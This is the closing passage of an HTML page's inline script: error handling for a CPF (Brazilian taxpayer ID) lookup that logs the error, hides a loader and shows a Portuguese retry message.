      } catch (error) {
        console.error('Erro ao consultar CPF:', error);
        document.getElementById('loader').style.display = 'none';
        document.getElementById('statusMessage').textContent = 'Erro ao consultar dados. Por favor, tente novamente.';
        document.getElementById('statusMessage').className = 'mb-4 font-medium text-red-600';
      }
    });
  </script>
</body>
</html>